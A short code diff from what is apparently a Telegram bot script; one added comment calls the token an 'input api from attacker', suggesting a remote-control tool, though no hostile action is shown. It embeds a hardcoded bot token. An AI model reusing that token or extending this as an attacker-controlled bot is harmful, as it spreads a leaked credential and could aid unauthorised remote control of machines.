@@ -6,9 +6,9 @@ import platform
 import wget
 import sys
 if(len(sys.argv)<2):
-    TOKEN="1791119401:AAFyp7tNLGFAVSz1cuIAGv1Cfty-w5NILvQ"  # get api òf bot 
+    TOKEN="1791119401:AAFyp7tNLGFAVSz1cuIAGv1Cfty-w5NILvQ"  # get api of bot 
 else:
-    TOKEN =sys.argv[1]
+    TOKEN =sys.argv[1] #input api from attacker
 bot = telebot.TeleBot(token=TOKEN)
 def findat(msg):
     # from a list of texts, it finds the one with the '@' sign
